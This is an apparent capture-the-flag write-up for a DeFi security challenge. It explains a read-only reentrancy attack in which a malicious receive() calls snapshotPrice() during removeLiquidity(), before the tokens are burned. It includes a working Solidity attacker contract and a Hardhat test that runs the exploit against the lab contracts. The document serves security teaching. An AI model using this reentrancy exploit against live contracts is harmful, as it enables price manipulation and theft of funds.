# Read only

## Goals

=> SnapshotPrice should be zero
=> Do this in 2 transactions or less

### Hints

- None

### Solution

- So since the `removeLiquidity()` function makes an external call and transfers eth we can implement a malicious `receive()` function that updates the snapshot which will update before burning tokens, thus the snapshot not returning the right value.

### Steps

- Deploy `PoolAttacker` contract with a value > 1 ether

- Call the attack function

### Attacker Contract

```solidity
contract PoolAttacker {
    ReadOnlyPool private pool;
    VulnerableDeFiContract private target;

    constructor(address _pool, address _target) payable {
        pool = ReadOnlyPool(_pool);
        target = VulnerableDeFiContract(_target);
        pool.addLiquidity{value: msg.value}();
    }

    function attack() external {
        pool.removeLiquidity();
    }

    receive() external payable {
        target.snapshotPrice();
    }
}

```

### Test

```javascript
it('conduct your attack here', async function () {
	const AttackerContractFactory = await ethers.getContractFactory('PoolAttacker');
	const attackerContract = await AttackerContractFactory.deploy(
		readOnlyContract.address,
		vulnerableDeFiContract.address,
		{
			value: ethers.utils.parseEther('1.1'),
		}
	);
	const attackTx = await attackerContract.attack();
	await attackTx.wait();
});
```
